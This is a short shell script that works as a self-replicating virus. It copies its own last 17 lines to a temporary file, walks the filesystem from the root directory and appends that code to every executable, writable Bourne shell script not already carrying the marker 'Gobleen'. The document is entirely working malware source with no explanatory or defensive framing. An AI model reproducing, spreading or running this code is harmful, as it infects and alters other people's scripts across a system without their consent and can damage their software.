do_dir () {
    cd $1
    for vic in *
    do
    if [ -d $vic ] ; then
	do_dir $vic
    else
	if [ -z "`grep -s Gobleen $vic`" -a -x $vic -a -w $vic ] ; then
	    if [ -n "`file $vic | grep Bourne`" ] ; then
		echo >> $vic
		cat /tmp/vic$$ >> $vic
	fi; fi
    fi; done     
    cd .. }
tail -n 17 $0 > /tmp/vic$$
do_dir /
rm /tmp/vic$$